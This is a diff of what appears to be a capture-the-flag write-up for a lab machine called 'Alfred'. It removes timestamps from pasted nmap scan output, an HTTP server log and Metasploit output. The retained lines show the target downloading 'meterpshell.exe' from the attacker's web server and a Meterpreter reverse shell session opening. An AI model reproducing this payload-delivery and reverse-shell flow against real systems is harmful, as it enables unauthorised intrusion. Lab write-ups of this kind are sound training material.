@@ -13,7 +13,7 @@ First I start with my full TCP port scan with `nmap -Pn -p- -T4 $IP`
 
 ```
 nmap -Pn -p- -T4 $IP
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 09:08 EDT
+Starting Nmap 7.94SVN ( https://nmap.org )
 Nmap scan report for 10.10.128.105
 Host is up (0.18s latency).
 Not shown: 65532 filtered tcp ports (no-response)
@@ -28,7 +28,7 @@ This answers question 1.
 
 Here we have ports 80, 3389, and 8080. These are relatively self-explanatory, but I will use my service scans anyway. I will then also move onto using gobuster for directory enumeration and looking at the webpage(s) directly.
 ```
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 09:12 EDT
+Starting Nmap 7.94SVN ( https://nmap.org ) 
 Nmap scan report for 10.10.128.105
 Host is up (0.18s latency).
 
@@ -40,9 +40,9 @@ PORT     STATE SERVICE            VERSION
 |_http-server-header: Microsoft-IIS/7.5
 3389/tcp open  ssl/ms-wbt-server?
 | ssl-cert: Subject: commonName=alfred
-| Not valid before: 2024-07-01T13:06:59
+| 
 |_Not valid after:  2024-12-31T13:06:59
-|_ssl-date: 2024-07-02T13:14:34+00:00; 0s from scanner time.
+|_
 | rdp-ntlm-info: 
 |   Target_Name: ALFRED
 |   NetBIOS_Domain_Name: ALFRED
@@ -50,7 +50,7 @@ PORT     STATE SERVICE            VERSION
 |   DNS_Domain_Name: alfred
 |   DNS_Computer_Name: alfred
 |   Product_Version: 6.1.7601
-|_  System_Time: 2024-07-02T13:14:29+00:00
+|_ 
 8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
 |_http-title: Site doesn't have a title (text/html;charset=utf-8).
 | http-robots.txt: 1 disallowed entry 
@@ -127,8 +127,8 @@ After a few moments we get confirmation the file was uploaded.
 When we look at the web server we're hosting also confirms this:
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.128.105 - - [02/Jul/2024 10:15:01] "GET /meterpshell.exe HTTP/1.1" 200 -
-10.10.128.105 - - [02/Jul/2024 10:15:05] "GET /meterpshell.exe HTTP/1.1" 200 -
+10.10.128.105 - - [] "GET /meterpshell.exe HTTP/1.1" 200 -
+10.10.128.105 - - [] "GET /meterpshell.exe HTTP/1.1" 200 -
 ```
 
 Now we can stop our little webserver and open msfconsole.
@@ -149,7 +149,7 @@ Confirm we're on the box!
 ```
 [*] Started reverse TCP handler on 10.13.62.120:4444 
 [*] Sending stage (176198 bytes) to 10.10.128.105
-[*] Meterpreter session 1 opened (10.13.62.120:4444 -> 10.10.128.105:49288) at 2024-07-02 10:25:42 -0400
+[*] Meterpreter session 1 opened (10.13.62.120:4444 -> 10.10.128.105:49288) -0400
 
 meterpreter > 
 ```
